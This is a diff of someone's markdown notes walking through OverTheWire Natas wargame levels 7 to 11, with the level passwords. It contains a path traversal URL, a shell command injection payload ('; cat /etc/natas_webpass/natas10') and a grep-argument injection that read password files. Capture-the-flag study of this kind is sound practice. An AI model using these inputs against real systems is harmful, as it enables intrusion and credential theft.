@@ -38,17 +38,19 @@ Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.o
 +  
 <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
 + path traversal = ```http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8```
+
 **Natas 8**  xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
   + page source showed the procces in which it was encoded..
+
 **Natas 9**
   + The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
   + looking at source code shows grep command.. this means we can command inject
   + ; cat /etc/natas_webpass/natas10
-  **Natas 10**
+**Natas 10**
   + t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
   + again its running the grep command .* shows allkinds of stuff lets try with something else
   + http://natas10.natas.labs.overthewire.org/index.php?needle=.*%20/etc/natas_webpass/natas11
   + .* /etc/natas_webpass/natas11 was the key
-  **Natas 11**
+**Natas 11**
     UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
     
